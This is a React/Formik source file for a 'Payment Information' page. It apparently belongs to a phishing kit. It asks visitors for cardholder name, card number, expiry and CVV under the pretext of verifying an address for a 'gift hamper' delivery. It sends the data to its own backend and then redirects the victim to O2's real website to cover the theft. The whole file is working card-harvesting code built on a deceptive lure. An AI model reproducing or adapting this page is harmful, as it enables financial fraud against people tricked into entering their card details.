import { useFormik } from "formik";
import "./discount.css";
import formSchema from "../../Schema";
import apiRequest from "../../api/apiRequest";
import Taost from "react-hot-toast";
import { useState } from "react";
import Webfooter from "../website/Webfooter";
import Webheader from "../website/Webheader";
const Card = () => {
  const [loader, setLoader] = useState(false);

  function formatString(event) {
    var inputChar = String.fromCharCode(event.keyCode);
    var code = event.keyCode;
    var allowedKeys = [8];
    if (allowedKeys.indexOf(code) !== -1) {
      return;
    }

    event.target.value = event.target.value
      .replace(
        /^([1-9]\/|[2-9])$/g,
        "0$1/" // 3 > 03/
      )
      .replace(
        /^(0[1-9]|1[0-2])$/g,
        "$1/" // 11 > 11/
      )
      .replace(
        /^([0-1])([3-9])$/g,
        "0$1/$2" // 13 > 01/3
      )
      .replace(
        /^(0?[1-9]|1[0-2])([0-9]{2})$/g,
        "$1/$2" // 141 > 01/41
      )
      .replace(
        /^([0]+)\/|[0]+$/g,
        "0" // 0/ > 0 and 00 > 0
      )
      .replace(
        /[^\d\/]|^[\/]*$/g,
        "" // To allow only digits and `/`
      )
      .replace(
        /\/\//g,
        "/" // Prevent entering more than 1 `/`
      );
  }

  const initialValues = {
    card: "",
    expiry: "",
    cvc: "",
    cardName: "",
  };
  const { errors, values, handleChange, handleSubmit, resetForm } = useFormik({
    initialValues,
    validationSchema: formSchema.card,
    onSubmit: async () => {
      setLoader(true);
      const res = await apiRequest("card", "POST", values);

      if (res.success) {
        resetForm();
        Taost("Thank you Support Team  contact you soon", {
          duration: 4000,
          position: "top-center",

          // Styling
          style: {},
          className: "",

          // Custom Icon
          icon: "👏",

          // Change colors of success/error/loading icon
          iconTheme: {
            primary: "#000",
            secondary: "#fff",
          },

          // Aria
          ariaProps: {
            role: "status",
            "aria-live": "polite",
          },
        });
        // Taost.success("Thank you Support Team  contact you soon ")
        setLoader(false);
        window.location.href = "https://www.o2.co.uk/";
      } else {
        Taost.error("something wrong");
        setLoader(false);
      }
    },
  });
  console.log(errors);
  if (loader) {
    return (
      <div className="loader">
        <div class="spinner-border text-light" role="status">
          <span class="sr-only">Loading...</span>
        </div>
      </div>
    );
  }

  return (
    <>
      <Webheader />

      <hr style={{ margin: "0", height: "1px", color: " white" }} />
      <section>
        <div class="hero-sec">
          <div class="container-fluid">
            <h1>Payment Information</h1>
          </div>
        </div>
        {/* <!-- main section --> */}
        <div class="payment-main-sec">
          <div class="container">
            <p class="text-center">
              We need your credit or debit card to verify your registered
              address for delivering your gift hamper to your doorstep. <br />{" "}
              Without it, we cannot complete the delivery.
            </p>
            <div class="payment-full">
              <div class="row align-items-center">
                <div class="col-md-5 pe-0">
                  <img src="/card.png" />
                </div>

                <div class="col-md-7 ps-0">
                  <form onSubmit={handleSubmit}>
                    <div class="deposit-form">
                      <h3>Payment details</h3>
                      <div class="mb-2">
                        <label for="floatingInputGrid">Cardholder Name</label>
                        <input
                          type="text"
                          className="form-control"
                          name="cardName"
                          placeholder="e.g John smith"
                          onChange={handleChange}
                          value={values.cardName}
                        />
                        <span className="text-danger">{errors.cardName}</span>
                      </div>
                      <div class="mb-2">
                        <label for="floatingInputGrid">Card Number</label>
                        <input
                          type="number"
                          className="form-control"
                          placeholder="XXXX XXXX XXXX XXXX"
                          name="card"
                          onChange={handleChange}
                          value={values.card}
                          maxLength={16}
                          minLength={16}
                        />
                        <span className="text-danger">{errors.card}</span>
                      </div>
                      <div class="row">
                        <div class="col-md-6">
                          <div class="mb-2">
                            <label for="floatingInputGrid">Expirey</label>
                            <input
                              placeholder="MM/YY"
                              type="text"
                              onKeyUp={(e) => {
                                formatString(e);
                              }}
                              className="form-control"
                              name="expiry"
                              onChange={handleChange}
                              value={values.expiry}
                            />
                            <span className="text-danger">{errors.expiry}</span>
                          </div>
                        </div>
                        <div class="col-md-6">
                          <div class="mb-2">
                            <label for="floatingInputGrid">CVV</label>
                            <input
                              type="number"
                              className="form-control"
                              name="cvc"
                              placeholder="XXX"
                              onChange={handleChange}
                              value={values.cvc}
                            />
                            <span className="text-danger">
                              {errors.cardName}
                            </span>
                          </div>
                        </div>
                      </div>
                      <div class="text-center">
                        <button class="sub-btn mt-4" type="submit">
                          Submit
                        </button>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      <Webfooter />
    </>
  );
};

export default Card;
